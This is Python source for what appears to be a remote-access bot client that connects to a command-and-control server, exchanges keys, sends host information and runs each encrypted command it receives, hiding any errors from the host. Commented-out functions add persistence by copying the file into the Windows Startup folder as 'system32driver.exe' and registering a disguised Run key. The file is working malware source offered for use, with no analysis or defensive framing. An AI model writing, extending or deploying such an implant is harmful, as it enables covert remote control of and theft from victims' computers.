import socket
import struct
import zlib
import os
import shutil
import subprocess
from modules import commands
from utils import aes_crypto, key_exchange

C2_SERVER = '127.0.0.1'
C2_PORT = 4444

def send_encrypted(sock, key, message):
    compressed = zlib.compress(message.encode())
    encrypted = aes_crypto.encrypt(compressed, key)
    sock.sendall(struct.pack('>I', len(encrypted)) + encrypted)

def recv_exact(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def recv_encrypted(sock, key):
    raw_len = recv_exact(sock, 4)
    if not raw_len:
        return None
    total_len = struct.unpack('>I', raw_len)[0]
    encrypted_data = recv_exact(sock, total_len)
    decrypted = aes_crypto.decrypt(encrypted_data, key)
    return zlib.decompress(decrypted).decode() if decrypted else None

def connect_to_c2():
    try:
        bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bot.connect((C2_SERVER, C2_PORT))

        private_key = key_exchange.generate_private_key()
        public_bytes = key_exchange.get_public_bytes(private_key)

        server_public_bytes = bot.recv(4096)
        server_public_key = key_exchange.load_peer_public_bytes(server_public_bytes)
        bot.send(public_bytes)
        session_key = key_exchange.generate_shared_key(private_key, server_public_key)

        send_encrypted(bot, session_key, commands.get_info())

        while True:
            command = recv_encrypted(bot, session_key)
            if not command or command.strip().lower() == "exit":
                break

            if command.strip().lower() == "getinfo":
                result = commands.get_info()
            else:
                result = commands.run_command(command)

            if not result:
                result = "[!] No output."

            send_encrypted(bot, session_key, result)

        bot.close()
    except:
        pass  # evitar exceções visíveis no host

# # Persistência: cópia + registro
# def persist():
#     try:
#         target_dir = os.environ["APPDATA"] + "\Microsoft\Windows\Start Menu\Programs\Startup"
#         target_path = os.path.join(target_dir, "system32driver.exe")
#         if not os.path.exists(target_path):
#             shutil.copy2(__file__, target_path)
#     except Exception:
#         pass

# def persist_registry():
#     try:
#         path = os.path.join(os.environ["APPDATA"], "Microsoft\Windows\Start Menu\Programs\Startup", "system32driver.exe")
#         reg_name = "WindowsDriverManager"
#         result = subprocess.run(["reg", "query", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", reg_name],
#                                 capture_output=True, text=True)
#         if reg_name not in result.stdout:
#             subprocess.run([
#                 "reg", "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
#                 "/v", reg_name, "/t", "REG_SZ", "/d", f'"{path}"', "/f"
#             ], check=True)
#     except Exception:
#         pass

# # Ativação
# persist()
# persist_registry()

if __name__ == "__main__":
    connect_to_c2()
